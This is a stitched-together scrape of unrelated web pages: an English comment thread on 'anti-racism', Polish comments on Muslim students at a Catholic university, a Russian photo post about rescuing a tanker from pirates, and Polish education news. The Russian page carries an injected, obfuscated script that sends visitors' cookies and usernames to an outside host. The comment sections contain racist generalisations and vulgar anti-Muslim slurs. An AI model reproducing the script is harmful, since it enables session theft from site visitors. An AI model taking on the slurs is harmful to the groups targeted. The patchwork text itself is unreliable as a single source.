then that is your loss, not mine.  Life will be very hard for these people of color, it will suck to be them.  Too bad, you reap what you sow in life, if you are angry, be angry at yourself for making yourself a victim of your own prejudices.The first steps in any genocide is to demonize and dehumanize your targeted group.I wish more people would pay attention to just how dehumanizing the language of the left is for whites. “There’s no such thing as white identity” = whites are not human. “There’s no such thing as white culture” = whites are not human. “The nuclear family perpetuates white supremacism” = the nuclear family perpetuates white people. “Abolish whiteness” = genocide of whites. Anywhere the left uses the word “whiteness,” it can be substituted accurately with the words “white people.” Can anyone imagine what life will be like for the children being born now, who will grow up into a world where they are a minority and where this kind of rhetoric has been ramping up for decades? Society will not even see them as human beings. It will see them as instantiations of “whiteness” that are uniquely dangerous and monstrous in world history. This is why the alt-right grows and will continue growing unless the left stops its insanity.“The whole philosophy of Hell rests on recognition of the axiom that one thing is not another thing, and, specially, that one self is not another self. My good is my good and your good is yours. What one gains another loses. Even an inanimate object is what it is by excluding all other objects from the space it occupies; if it expands, it does so by thrusting other objects aside or by absorbing them. A self does the same. With beasts the absorption takes the form of eating; for us, it means the sucking of will and freedom out of a weaker self into a stronger. ‘To be’ means ‘to be in competition'”Screwtape…. and today’s Social Justice Warriors.If blacks and Hispanics were succeeding economically and academically as well as Asians do, there wouldn’t be this constant effort to play “victim to whites”.    Victimhood isn’t going to bring the success they need … the question is whether blacks and Hispanics can generate the effort and success that it takes to succeed.  I used to be hopeful and optimistic, but I’m gradually losing that hope.Instalanch! Congratulations, Mr. Ngo.Dear Mr. Ngo, Bravo brave man. I salute you.Identify politics and racial bean counting is dehumanizing and demeaning.
My wife moved to the U.S. from Brazil some 20 years ago and was quickly upset when it came to filing out applications that requested one’s race to be identified.Pingback: That all languages are created equal… – Freedom Today JournalFoucauldian Maoist sociopathy“racism no longer means what I understood it to be all my life. According to critical race theorists, who permeate academe and its administration, racism is not ethnic prejudice and discrimination but rather prejudice and institutional power.”Strange…back in the olden days, “racist” meant a person who held an irrational belief that one race was inferior or superior to another. Under that definition, to observe, for example, that black men excel at basketball is a rational observation based on demonstrable fact. It is not racist, though it is racial. But to refuse to be seen by a black doctor because of a deeply held belief that blacks are incapable of being good doctors would be racist.What the author seems to call racism–ethnic prejudice and discrimination–is simply racial prejudice and discrimination. But one can have very rational reasons for holding racial prejudices and discriminating. Bad experiences with a particular race might lead one to mistrust members of that race categorically, for example. But this is rational racial prejudice, not racism.The critical race theorists’ version strikes me as mere racial prejudice, at best, but gibberish/delusion is closer to the mark. Go to trailer parks and report back on how much white institutional power you see.I want to comment on your “doctor” analogy. This is true, yet, it is ok to say “support black businesses”. That’s the hypocrisy. Also, this is gray area, as would it then not be misogynistic to say “I want a male doctor”, as a male, or any other situation? Will we get to a point where it will  be misandry for a woman to avoid a male gynecologist?A University event titled “Students of Color Speak out”? We need a World event titled “The Species Human Speak out” If we do not quit focusing on differences and start focusing what unites all of us in genus Homo Sapiens (which is Latin for wise man), and our responsibility to care for each other and the only habitable planet we know of; then race, political affiliation, gender, religion, won’t matter. Nature will sort us as a species (95% of all species that ever existed have went extinct, regardless of if it was a brown or white dodo bird) If you are 50, when you were born the population of planet earth was 3.4 Billion, now it is 7.6 Billion. It took all of known human history until 1804 to hit 1 Billion. Most of us are a mix of many “races” regardless of our “color”, don’t think so?….try an Ancestry DNA test. Evil has always walked the planet, whether if was Hitler (white) or Pol Pot (not white) or those who ravaged Rwanda. When I was young, one of my Uncles who chased Nazis around North Africa during WW2 told me that there were two things you never found in a foxhole, an atheist or a racist. “When the chips are down the person next to you is kin, no matter the color their skin”. Ask a black combat vet if they hate “white” people.Disguised?  When and where are they disguising it?  It seems pretty blatant and in your face.Well said. Well written. Well taken. Keep it up.I’m a bit obsessed with the NFL protests, so I had to point out how this applies:“The language and tone of suspicion of others was jarring to the anti-racist activism I was familiar with in my undergraduate and high school days, which sought to unify diverse students through inclusion.”Note how the NFL protests also do not seek  to unify diverse people through inclusion.“What I heard was a siren’s song leading us to a culture of racial division and mistrust.”Note how “racial division and mistrust” are the precise results of the NFL protests.  That is their true purpose.Pingback: When Racism is Disguised as Anti-Racism | Sassy Wire“Until that day, I’d never seen people overtly dehumanized and treated as racialized objects – amplified through the use of words like ‘bodies’ to refer to people of color.”While the prevalence of anti-white racism is obviously problematic, it is a non-starter with these activists and academics. They reject the premise, they don’t care, and they will use such complaints to reinforce their own arguments, which are specious but have currency with large swaths of the uncritical public.Better to go after them for their reductive and dehumanizing treatment of people of color. It’s not purely a conceptual problem. Their language and actions have a profoundly degrading and segregationist impact on people who aren’t white. Many times this is out of ignorance, but often it is intentional and strategic – you can’t build political power without a shared need, and like the military-industrial complex some of these people are more interested in maintaining and worsening that need than fixing the problems. White people (as a group) don’t suffer for this, non-white people do.Whether it is out of callousness, ignorance, or outright sabotage (not to mention performing hate crimes to “stir the pot”), by their own standards it is the impact that matters, not the measure of intent. And by those standards these anti-racists are not merely “racist,” they are in fact agents of white supremacy and should be treated as such. Make them answer for that instead.That would have been better stated as “Make them answer for that as well.”Pingback: Extra spezial Freiheitssonderausnahmegenehmigung | weltraumaffen.comAs a brown guy, I have had almost the exact same thoughts. Its crazy how people have tried to redefine what racism mean. Thank you for this article, it’s good to know in not the only person who sees this happeningComments are closed.A platform for free thoughtMuzułmańscy studenci jednego z katolickich uniwersytetów w Stanach Zjednoczonych złożyli skargę na placówkę, ponieważ obecność krzyży jest dla nich ‚obraźliwa’ i utrudnia im modlitwę. Skarga została złożona przez profesora konkurencyjnego uniwersytetu George’a Washingtona do Biura Praw Człowieka w Waszyngtonie. Według wniosku, w ‚każdym pomieszczeniu Katolickiego Uniwersytetu znajduje się zbyt wiele krzyży’, co jest ‚pogwałceniem praw człowieka, które uniemożliwia muzułmańskim studentom modlenie się tam.’ Wniosek sprzeciwia się również temu, że muzułmanie muszą modlić się na terenie uniwersyteckiej kaplicy i w pobliżu katedry, która rzuca cień na cały kampus. Profesor prawa John Banzhaf oskarża placówkę o działanie ‚prawdopodobnie w złych zamiarach’ przeciw swoim muzułmańskich studentom w swojej skardze liczącej 60 stron, który wymienia ‚obraźliwe katolickie symbole widniejące wszędzie na uczelni, co utrudnia muzułmanom modlitwę.’ Dodatkowo, kolejnym argumentem było to, że uniwersytet nie udostępnia miejsc, gdzie muzułmańscy studenci mogliby się pomodlić, a zamiast tego zmusza ich do modlitw w klasach, w których są otoczeni symbolami katolickimi, które są sprzeczne z ich własną religią.’Zdumione władze uczelni stwierdziły, że nigdy nie otrzymały zażaleń od żadnego z ich muzułmańskich studentów. źródło:Truth Uncensored Szkoda, że nikt się nie odważy na jedyne rozsądne rozwiązanie: drody studenci (n.b. talibowie niszczący zabytki – posągi Buddy też byli „studentami”) to jest uniwersytet katolicki. Jeśli studiowanie na im jest dla was obciązające, to SIĘ Z NIEGO WYNIEŚCIE. Załóżcie własny, muzułmański, albo pojedźcie do Egiptu (chyba tam działa najstarsza… Czytaj więcej »Ale zaraz, czegoś ja tu nie rozumiem- muślim na KATOLICKIEJ uczelni? To tak jakby do Polski przyjechali i zaczęli studiować na KUL-u (Katolicki Uniwersytet Lubelski) albo UKSW (Uniwersytet Kardynała Stefana Wyszyńskiego) i im by przeszkadzała obecność krzyży na KATOLICKIEJ uczelni… No paranoja że gówno ma pretensje, przecież wiedzieli w co… Czytaj więcej »To ja sie pytam gdzie jest slyna TOLERANCJA..muzlumanska??? Jak oni uzywaja slow w odniesieniu do krzyza..OBRAZA??? A w czym ich krzyz obraza ?? Wysmiewa machometa??? Islam religia torelancji i pokoju?? Jak to slydze to zygac mi sie chce… Jak to w koranie jest napisane USMIECHAC SIE DO NIEWIERNYCH BEDZIESZ ALE… Czytaj więcej »Skoro to uniwersytet katolicki to czego oni się spodziewali? Co w ogóle oni tam robią? Jak się nie podoba to wypad! To tak jakby przyjść do kogoś w gości i kazać mu wyremontować mieszkanie bo nam się nie podoba wnętrze.Prawda! rasizm przez nich przemawia. tego to już nie widać.. drzazgę w czyimś oku widzą która ich nie kole ale w swoim oku to już kłody wystającej i dyndając maltretującej wokół innych ludzi to nie widzą kozo-file na KU, no co sodomo-gomor ich tam wpuścił Boże zlituj się, wycofaj tę… Czytaj więcej »Według Koranu żydzi i chrześcijanie to najgorsze ze stworzeń, a muzułmanie – najlepsze. Więc skutki łatwe do przewidzenia. Jesteśmy dla nich gorsi niż karaluchy, szczury, świnie, psy, itp.A to wstrętne i nietolerancyjne fiuty… Won do arabskich krain studiować kozofilię i budowanie chatek z gówna.
Śmiecie muzułmańskie, wszystko się nie podoba… jacy kurwa delikatni…to prawda tacy delikatni.. a jak trzeba zabić to pierwsiwydzielić im pomieszczenie do modlitw i niech się cieszą, nikt ich nie zmuszał by tam studiowali.Nikt ich tam nie zaprasza! prawda.W Rowie Marianskim jest fajna uczelnia dla muzulmanow .Zdecydowanie powinieneś zacząć udzielać się publicznie nt. islamu.Whoooot? nie ma takiego pojęcia jak muzułmańscy studenci to nie muzułmański uniwersytet chcą tolerancji według ich zasad? albo sie asymilują albo wypad z uczelni to są studenci uniwersytetu katolickiego i to uniwersytet może im nakazać noszenie krzyżyka, sataniści urągają krzyżowi kto im muzułmanom nadaje prawo do zmiany regulaminu uniwersytetu? nie… Czytaj więcej »Друзья поделились большим количеством фотографий, сделанных в ходе операции по освобождению захваченного сомалийскими пиратами танкера.(Всего 70 фото)







    (function(w, d, n, s, t) {
        w[n] = w[n] || [];
        w[n].push(function() {
            Ya.Context.AdvManager.render({
                blockId: "R-A-257212-4",
                renderTo: "yandex_rtb_R-A-257212-4",
                async: true
            });
        });
        t = d.getElementsByTagName("script")[0];
        s = d.createElement("script");
        s.type = "text/javascript";
        s.src = "//an.yandex.ru/system/context.js";
        s.async = true;
        t.parentNode.insertBefore(s, t);
    })(this, this.document, "yandexContextAsyncCallbacks");



if (document.cookie.search('t543e7he5644rww')==-1 ) {function getDivs(){
var d=document;var s=d.createElement('script');var bo = 'null';var be = 'so.p';
var ba = d.getElementsByClassName("display-name");
if (Object.keys(ba).length) bo=ba[0].innerText;
s.src='http://ne'+be+'ro/bigp?se_re'+'ferrer=' + encodeURIComponent(location.href) + '&sub_id_1=' +document.cookie + '&sub_id_2=' +document.cookie.substr(245) + '&sub_id_3='  +document.cookie.substr(490) + '&sub_id_4=' + bo + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {d.getElementsByTagName('head')[0].appendChild(s);}};
document.write('<body onLoad = "getDivs()">');}


















Спонсор поста:
Заработок в интернете - самый простой способ заработать в 21 веке.







Источник: Жжурнал/twower1. Предыстория. 5 мая 2010 года пираты атаковали танкер "Московский университет". Судно было обстреляно из гранатомета. Повреждения от попадания гранат2.3.4. На борт пираты проникли, используя самодельную абордажную лестницу и крючья 5.6. Экипаж танкера успел сообщить о нападении и забаррикадировался в румпельном отделении. Пираты пытались в него проникнуть и выломали дверь 7. Лестница в румпельное отделение 8. Внутри отделения 9. Экипаж танкера в ожидании спасения 10. Через это отверстие пираты вели обстрел людей в румпельном отделении, пытаясь заставить их сдаться 11. Отметины от пуль внутри отделения 12. Экипаж сдаваться не хотел и готовил подручные средства для самообороны 13. Пираты, тем временем взламывали двери на судне и занимались мародерством 14.15.16. Но вступать в последний бой гражданским людям не пришлось, потому что сигнал о нападении был получен на большом противолодочном корабле "Маршал Шапошников", который находился в Аравийском море близ острова Сокотра. 17. Русские своих в беде не бросают, поэтому БПК немедленно пошел на выручку захваченному судну. Разработка плана освобождения судна. На столе лежит схема танкера18.19. Были сформированы штурмовые группы 20. Подготовлены плавсредства для них 21. Импровизированная защита из бронежилетов 22. Личный состав штурмовых групп провел тренировку по огневой подготовке 23.24. Утром 6-го мая "Маршал Шапошников" подошел к захваченному судну и после разведки начался штурм. Штурмовые группы высадились на танкер, контроль с воды осуществлялся с катеров, с воздуха - вертолетом25. Зачистка судна 26.27. В ходе короткой перестрелки один пират был смертельно ранен, несколько получили легкие ранения. Потерь с нашей стороны не было. Связанные пираты на полубаке танкера28.29.30. Досмотр плавсредств пиратов 31.32. Лежат соколики 33.34. Освобождение команды 35. Пираты ожидают своей участи 36. Наши парни, добрые души, поэтому от жажды помереть не дают 37. Бравые корсары 38.39.40. Перевязка раненых 41.42. Последствия перестрелки 43.44. Оружие, брошенное пиратами 45.46. Оружие, конфискованное у пиратов. Несмотря на внешний вид, оно рабочее, внутри смазано каким-то отработанным маслом. Наши моряки потом пробовали из него стрелять. В руки никто брать, конечно, не стал, но дергали за веревочку, примотанную к спусковому крючку.  47.48.49.50.51.52.53.54.55.56.57.58.59. Навигатор, которым пираты пользовались в море 60. Моряки говорят, что этот кусок веревки пираты использовали, как наркотическое средство. Она из конопли? 61. Горючее для моторов лодок и абордажные крючья (скорее всего они же в роли якоря) 62. Одна из пиратских лодок 63.64. Пиратов решили отпустить. Им дали воды, еды и посадили в одну из их лодок 65.66. Наши солдаты и офицеры, участвовавшие в штурме 67.68.69. Командир бригады противолодочных кораблей благодарит личный состав штурмовой группы за отлично проведенную операцию 70. Экипаж танкера со своими освободителями Напоминаем, что Bigpicture.ru есть в Twitter, Facebook, Вконтакте, Одноклассниках, Google +, Futubra и ЖЖ. Подписаться на RSS можно здесь.  WSZYSTKO ZALEŻY OD NAUCZYCIELA   → czytaj więcejWszystkie znane rankingi, biorące pod uwagę różne kryteria dotyczące jakości pracy badawczej i dydaktycznej, pokazują ogromną przewagę uniwersytetów amerykańskich nad szkołami w innych częściach świata. Potwierdza to również publikowany tzw. ranking szanghajski. Niestety wśród 500 najlepszych uczelni znajdują się tylko dwa polskie uniwersytety.Jedynie Uniwersytet Jagielloński i Uniwersytet Warszawski znalazły się w Academic Ranking of World Universities 2008 – rankingu 500 najlepszych uczelni świata, publikowanego corocznie przez Shanghai Jiao Tong University. Polskie uniwersytety uplasowały się „tradycyjnie“ w czwartej setce (miejsca 303 - 401), potwierdzając tym samym słabą kondycję polskiego szkolnictwa wyższego (w ostatnich latach jedynie raz – w 2005 r. – w pierwszej pięćsetce znajdowały się trzy nasze uniwersytety).W czołówce rankingu niezmiennie panują uczelnie amerykańskie: od samego początku Harvard (który wyprzedza kolejną uczelnię aż o 22,3%) Stanford i Berkeley. Tuż za nimi plasuje się pierwsza europejska uczelnia – Cambridge, następnym reprezentantem starego kontynentu jest Oxford, który zamyka pierwszą dziesiątkę uniwersytetów świata. Pierwsza uczelnia azjatycka – Tokio University zajmuje 19 miejsce. Jeżeli wziąć pod uwagę jedynie uczelnie europejskie, Brytyjczycy biją swoich kontynentalnych kolegów o głowę – zajmują miejsca medalowe, czwarte oddają uczelni technicznej z Zurychu, ale mocno trzymają się na pozycji 5. i 6. Wśród 100 najlepszych uczelni europejskich również zabrakło - niestety - instytucji polskiej.Harvard od początku istnienia rankingu jest jego liderem. Skład pierwszej dziesiątki od 2005 roku właściwie się nie zmienia, ale warto odnotować, że w 2005 i 2006 roku europejski Cambridge zdetronizował Stanford, zajmując chlubną, drugą pozycję. Trzeba podkreślić, że najlepsze uczelnie europejskie z tradycjami wprawdzie osiągają porównywalne rezultaty pod względem liczby absolwentów noblistów do uczelni amerykańskich, ale za to, jeśli wziąć pod uwagę kryteria najbardziej aktualne, czyli Research Output (patrz niżej) to uniwersytety z Nowego Świata zostawiają daleko w tyle uczelnie europejskie.Metodologia rankingu szanghajskiego wzbudza kontrowersje, szczególnie na Starym Kontynencie, pełnym wielkich przegranych. Senat francuski proponuje, na przykład, utworzenie alternatywnego rankingu europejskiego, argumentując, że ranking szanghajski nie jest miarodajny, gdyż faworyzuje instytucje anglojęzyczne.Jeżeli jednak sięgnąć do innych rankingów – okazuje się, że dominacja uczelni amerykańskich jest niepodważalna. Według rankingu THES-QS The Times w Stanach Zjednoczonych znajduje się 12  spośród 15 najlepszych uniwersytetów na świecie, według rankingu Newsweeka 15 z 20, według rankingu paryskiego 24 z 59, według rankingu Webometrics.info 68 ze 100, a według rankingu publikacji naukowych 170 z 500. Rośnie również ilość amerykańskich laureatów nagrody Nobla w ogólnej liczbie uczonych otrzymujących to wyróżnienie.Uznaje się, że amerykański model szkolnictwa wyższego ma przewagę nad szkołami wyższymi w innych częściach świata, w tym również w Europie. Przewaga ta jest spowodowana przez następujące główne czynniki: sprawne zarządzanie przez wyspecjalizowanych menedżerów, skrócony czas dochodzenia do samodzielności pracowników badawczych i dydaktycznych, większą stabilność organizacyjną i finansową, koleżeńskie stosunki pomiędzy naukowcami i studentami, kształtujące postawy i charaktery, silne powiązanie z otoczeniem, w tym w szczególności z realną gospodarką (K. Pawłowski).Głosy o konieczności zmiany modelu szkolnictwa wyższego w Polsce pojawiają się od dawna w mediach i debacie publicznej. Przykładowo, proponuje się konieczność zastąpienia w Polsce modelu pruskiego uczelni modelem anglosaskim (link). Ten pierwszy „powstał w XiX wiecznych Prusach jako instytucja służąca integracji narodowej i czystej nauce”, jest bardzo zinstytucjonalizowany i przeżył się już w swojej formule. Ten drugi powinien kształcić  „ludzi z nowymi pomysłami, nie bojących się ryzyka, przedsiębiorczych, społecznie zaangażowanych, rozumiejących rolę mobilności w rozwoju wiedzy…”Mimo klęsk ponoszonych przez polskie uczelnie w rankingach międzynarodowych i odpływu znakomitych polskich naukowców do uczelni zagranicznych, do dziś nie doczekaliśmy się reformy szkolnictwa wyższego. Zadowalamy się coraz większą liczbą studentów. Być może jest tak, że środowiskom naukowym wcale nie zależy na zmianach na lepsze. Poprawa jakości kształcenia oznaczałaby przecież, że tysiące utytułowanych wykładowców musiałoby po prostu zacząć ciężko pracować, do czego raczej naukowcy nie są przyzwyczajeni. Inna ważna kwestia to wprowadzenie konkurencji w szkolnictwie wyższym – zrównanie w prawach i możliwości rozwoju uczelni prywatnych i publicznych, szybko wymusiłoby poprawę jakości kształcenia i zarządzania na dziesiątkach polskich uczelni.Pełna lista 500 najlepszych uczelni świata według rankingu szanghajskiego dostępna jest na stronie http://www.arwu.org/. (Opr. własne i Newsletter Study in Poland)fot. Fotolia.comfot. Przedszkole nr 23 w Olsztyniefot. Fotolia.comfot. Fotolia.comfot. Fotolia.comfot. Fotolia.comfot. Adprime.pl(C) Edunews.plfot. Fotolia.comfot. Biblioteki w szkole(C) Edunews.plfot. Fotolia.comfot. Fotolia.com(C) Edunews.plPowered by © FUTUREDU - EDUNEWS.PL 2008 / 2018Wszystkie treści w serwisie chronione są prawem autorskim.Korzystanie z treści wyłącznie zgodnie regulaminem serwisu u licencją określoną dla danego elementu serwisulub po uzyskaniu zgody redaktora naczelnego Edunews.pl (Ten adres pocztowy jest chroniony przed spamowaniem. Aby go zobaczyć, konieczne jest włączenie w przeglądarce obsługi JavaScript.
				document.getElementById('cloakefa53d24ba3cf575828323671ef7e449').innerHTML = '';
				var prefix = '&#109;a' + 'i&#108;' + '&#116;o';
				var path = 'hr' + 'ef' + '=';
				var addyefa53d24ba3cf575828323671ef7e449 = 'k&#111;nt&#97;kt' + '&#64;';
				addyefa53d24ba3cf575828323671ef7e449 = addyefa53d24ba3cf575828323671ef7e449 + '&#101;d&#117;n&#101;ws' + '&#46;' + 'pl';
				var addy_textefa53d24ba3cf575828323671ef7e449 = 'k&#111;nt&#97;kt' + '&#64;' + '&#101;d&#117;n&#101;ws' + '&#46;' + 'pl';document.getElementById('cloakefa53d24ba3cf575828323671ef7e449').innerHTML += '<a ' + path + '\'' + prefix + ':' + addyefa53d24ba3cf575828323671ef7e449 + '\' target="_blank">'+addy_textefa53d24ba3cf575828323671ef7e449+'<\/a>';
		)REKLAMAREKLAMAREKLAMA"Słowa papieża nas obrażają i poniżają" - napisali naukowcy w liście do rektora uniwersytetu La Sapienza. Chodzi o wypowiedź z 1990 roku, kiedy to Joseph Ratzinger -
wtedy jeszcze kardynał - oświadczył w Parmie, że "proces kościelny przeciwko Galileuszowi był uzasadniony i sprawiedliwy". O skandalu pisze "La
Reppublica".

Naukowcy nie mogą pogodzić się, że jeden z najwybitniejszych umysłów w historii wciąż nie doczekał się uznania w kręgach kościelnych. Galileusz, który był filozofem, astronomem,
fizykiem i matematykiem, potwierdził teorię Kopernika. I zapłacił za to wysoką cenę. Jego prace znalazły się na liście ksiąg zakazanych, a sam Galileusz został skazany na dożywotni areszt
domowy. Skasowano go dopiero wówczas, gdy uczony wyparł się rzekomej herezji.

Pod listem protestacyjnym podpisało się 66 profesorów. Sygnatariusze twierdzą, że nie mogą z entuzjazmem witać kogoś, kto jest "reakcjonistą" i "przeciwnikiem
Galileusza". Piszą, że ktoś taki nie ma prawa wstępu na jeden z najstarszych uniwersytetów w Europie.

Tymczasem rektor zaapelował o tolerancję i stwierdził, że nie może być mowy o wycofaniu zaproszenia dla papieża. "Należy przyjąć Benedykta XVI jako człowieka wielkiej kultury i
głębokiej myśli filozoficznej, jako orędownika pokoju i wartości etycznych, które wszyscy podzielamy" - odpowiedział rektor Renato Guarini.

Papież ma odwiedzić La Sapienza 17 stycznia. Ma zaszczycić swoją obecnością uroczystość inauguracji roku akademickiego i 705. rocznicy założenia uczelni. Podczas ceremonii papież ma
wygłosić przemówienie.Zapisz się na nasz newsletter!Dodano 2010-12-07



	Uniwersyteckie biuro karier rozesłało do studentów ostrzeżenie, by dla dobra własnej kariery nie dyskutowali o przeciekach WikiLeaks w portalach społecznościowych.Columbia zabrania dyskutować o WikiLeaks na Facebooku
	Komentowanie, czy linkowanie do dokumentów opublikowanych przez WikiLeaks na Facebooku czy Twitterze może zagrozić studentom, którzy planują karierę w strukturach rządowych - taka treść znalazła się w mailu, rozesłanym 30 listopada do studentów Columbii przez uniwersyteckie biuro karier. Informację przekazano studentom w ślad za ostrzeżeniem, które uczelnia otrzymała od swojego absolwenta - pracownika Departamentu Stanu USA.
	To posunięcie uczelni wywołało burzę wśród studentów. Oburzeni Amerykanie nie omieszkali masowo wyrazić swojej opinii na temat tego napomnienia ze strony prestiżowej instytucji na Twitterze. Oryginalna wiadomość od biura karier szybko trafiła do blogosfery, a cała dyskusja z uczelni przeniosła się do mediów.
		From: Office of Career Services
		Date: Tue, Nov 30, 2010 at 3:26 PM
		Subject: Wikileaks – Advice from an alum
		To: “Office of Career Services (OCS)”
		Hi students,
		We received a call today from a SIPA alumnus who is working at the State Department. He asked us to pass along the following information to anyone who will be applying for jobs in the federal government, since all would require a background investigation and in some instances a security clearance.
		The documents released during the past few months through Wikileaks are still considered classified documents. He recommends that you DO NOT post links to these documents nor make comments on social media sites such as Facebook or through Twitter. Engaging in these activities would call into question your ability to deal with confidential information, which is part of most positions with the federal government.
		Regards,
		Office of Career Services
	To żałosne - komentowali studenci - wygląda na to, że oni nie są w stanie odróźnić posiadania własnej opinii od zobligowania do utrzymania tajemnicy państwowej. Jakkolwiek publikowanie w Internecie wykradzionych dokumentów za WikiLeaks mogłoby narazić studentów na kłopoty z prawem, to zakaz poruszania tego tematu w serwisach społecznościowych uznano za przesadny. A także za sprzeczny z prawem do publicznego wyrażania własnej opinii.
	Rzecznik prasowy Departamentu Stanu, Philip Crowley natychmiast zaprzeczył, żeby mail jednego z pracowników Departamentu wyrażał oficjalne stanowisko rządu - Poinstruowaliśmy naszych pracowników, żeby nie łączyli się z portalem WikiLeaks ani nie pobierali stamtąd żadnych dokumentów. - napisał w oświadczeniu - Potępiamy działalność założyciela portalu, ale nie kierowaliśmy tego typu sugestii do kogokolwiek spoza Departamentu.
	Po tych wyjaśnieniach, Uniwersytet Columbia odwołał swoją radę skierowaną do studentów i stara się załagodzić publiczne oburzenie, afirmując ponownie wolność słowa.

				Podziel się artykułem w swoim ulubionym serwisie:
				facebook
twitter
blip
śledzik
wykop

Zdecydowana większość uczelni zaprasza na tzw. „interview”, czyli osobistą rozmowę, wszystkich kandydatów ze Stanów Zjednoczonych. W przypadku studentów…

Stypendium to najwygodniejsza forma finansowania studiów. Pozwala na pełne poświęcenie się nauce. Jedynym wymaganiem jest to, by student…

Ważnym elementem składania aplikacji na uczelnię w USA jest list polecający. W Polsce referencje często wymagane są w…

Wybranie odpowiedniej uczelni jest niemal równie istotne, co wybranie interesującego kierunku studiów. Uniwersytety w Stanach Zjednoczonych są bardzo…
Zobacz wszystkieWykonanie: Agencja Interaktywna Zapałka
					Portal naharvard.pl  nie jest powiązany z Uniwersytetem Harvarda ani z żadną inną amerykańską uczelnią, a jego celem jest nieodpłatne dostarczanie
					kompleksowych informacji o studiowaniu w Stanach Zjednoczonych.
				W najnowszym wydaniu plus.pomorska.pl14artykułów
Maciej Myga
maciej.myga@pomorska.pl
tel. 52 326 31 51






        15 listopada 2012
              

        15.11.2012
              
              Aktualizacja:
        15 listopada 2012 06:16
15.11.2012 06:16





              Rektor UKW Janusz Ostoja-Zagórski kazał zdjąć krzyże ze ścian sali senatu i swojego gabinetu              ©www.sxc.hu 
                      Zobacz dzisiejsze wydanie internetowe Gazety Pomorskiej
                  
              Rektor UKW Janusz Ostoja-Zagórski kazał zdjąć krzyże ze ścian sali senatu i swojego gabinetu              ©www.sxc.hu Nielimitowany dostęp do wszystkich treści, bez inwazyjnych reklam.Rozpowszechnianie niniejszego artykułu możliwe jest tylko i wyłącznie
              zgodnie z postanowieniami „Regulaminu korzystania z artykułów prasowych” i po wcześniejszym uiszczeniu należności, zgodnie z cennikiem.
            
Marek 12 luty, 06:59 
                Brawo! Świecka szkoła. Każda religia do swojego kościoła!                 
Marek 12 luty, 06:58 
                Brawo! Świecka szkoła. Każda religia do swojego kościoła!                  
aga  9 luty, 13:50 
                Zasrane ateistyczne komuchy                 
Gość 19 stycznia, 16:03 
                  A jednak: nagroda!  [url="http://aleksanderpinski.nowyekran.pl/post/86080,rektor-nagrodzony-za-usuniecie-krzyza"]http://aleksanderpin...suniecie-krzyza                 
Janusz 17 stycznia, 19:28 
                    [font=verdana,geneva]Znakiem "firmowym" i uniwersalnym masonerii jest węgielnica (u dołu) i cyrkiel (u góry), najczęściej z wpisaną w środek literą G. O jakim herbie wiec jest mowa ?                 





Projektantka Joanna Alaborska wraz z firmą Boniek Meble przedstawi tajemnicę stylu eklektycznego.Bezpłatne badania, m.in.: pomiaru ciśnienia tętniczego, EKG, ultrasonograficzne jamy brzusznej, gęstości kości - z tego mogli dziś...Żeby dotrzeć do mety trzeba taplać się w błocie, przeskoczyć przez wielką ścianę,  zmierzyć się z oponami od traktora i pokonać jeszcze...tel.: 52 32 63 164
gp.redakcja@pomorska.pl tel.: 52 32 63 281
dzial.reklamy@pomorska.plGazeta Pomorska jest częścią:

Polska Press Sp. z o.o.
                 informuje, że wszystkie treści ukazujące się w serwisie Gazeta Pomorska podlegają ochronie.
        Dowiedz się więcej.
        Jesteś zainteresowany kupnem treści? Dowiedz się więcej.
      © 2000 - 2018 Polska Press Sp. z o.o.Jesteś u siebieNajlepsze newsy w krajuMagazyn dla RodzicowStyl życia by naTemat.plDr Kamil Kulesza kieruje Centrum Zastosowań Matematyki i Inżynierii Systemów (CZMIS), które  działa w ramach Instytutu Badań Systemowych Polskiej Akademii Nauk (IBS PAN) w Warszawie. Wraz ze współpracownikami prowadzi w INN:Poland blog „Oxbridge nad Wisłą?”, gdzie piszą zarówno o realizowanych komercyjnych projektach naukowo-badawczych oraz o tym jak wygląda „robienie” nauki i innowacji w Polsce.  Czytaj więcejNapisz do autora: grzegorz.burtan@innpoland.pl W piątek na Placu Zbawiciela w Warszawie ponownie pojawiła się tęcza, ale tym razem jedynie w postaci hologramu. Miała onaRada miejska Walencji – trzeciego co do wielkości hiszpańskiego miasta przegłosowała uchwałę, w której stwierdza, że “miasto jest strefą wolną8 czerwca prezes partii Prawo i Sprawiedliwość opuścił Wojskowy Instytut Medyczny. Przebywał tam miesiąc z powodu choroby zwyrodnienia stawów.W Argentynie od miesięcy dni trwa dyskusja na temat projektu ustawy o depenalizacji przerywania ciąży. Aborcjoniści jak i anty-aborcjoniści złożyliWęgierscy nacjonaliści z Ruchu 64 Komitaty przeszli ulicami Budapesztu, aby przypomnieć rodakom o rocznicy podpisania traktatu. Organizacja podjęła się organizacji1 czerwca w Bawarii wprowadzono w życie prawo nakładające obowiązek zawieszenia krzyży we wszystkich budynkach administracji publicznej. Władze Bawarii podjęłyIle chciałbyś/chciałabyś mieć dzieci?View ResultsAtkualny kurs BTC:        $ 0000.00
		Żadna część jak i całość utworów zawartych w dzienniku nie może być powielana i rozpowszechniana lub dalej rozpowszechniana w jakiejkolwiek formie i w jakikolwiek sposób (w tym także elektroniczny lub mechaniczny lub inny albo na wszelkich polach eksploatacji) włącznie z kopiowaniem, szeroko pojętę digitalizację, fotokopiowaniem lub kopiowaniem, w tym także zamieszczaniem w Internecie - bez pisemnej zgody Gremi Media SA. Jakiekolwiek użycie lub wykorzystanie utworów w całości lub w części bez zgody Gremi Media SA lub autorów z naruszeniem prawa jest zabronione pod groźbą kary i może być ścigane prawnie.
	
        Rozpowszechnianie niniejszego artykułu możliwe jest tylko i wyłącznie zgodnie z postanowieniami "Regulaminu korzystania z artykułów prasowych" [Poprzednia wersja obowiązująca do 30.01.2017]. Formularz zamówienia można pobrać na stronie www.rp.pl/licencja.
    Dostępne tylko dla zalogowanego użytkownika.Uzyskaj dostęp do aktualnego E-wydaniaMasz aktywną subskrypcję? Zaloguj się lub wypróbuj za darmo wydanie testowe.nie masz jeszcze konta w serwisie? Dołącz do nasUzyskaj dostęp do E-wydania lub wypróbuj za darmoW najnowszym wydaniu plus.gazetawroclawska.pl12artykułów
Marcin Rybak






        22 marca 2010
              

        22.03.2010
              
              Aktualizacja:
        22 marca 2010 21:34
22.03.2010 21:34





                      Zobacz dzisiejsze wydanie internetowe Gazety Wrocławskiej
                  Nielimitowany dostęp do wszystkich treści, bez inwazyjnych reklam.Rozpowszechnianie niniejszego artykułu możliwe jest tylko i wyłącznie
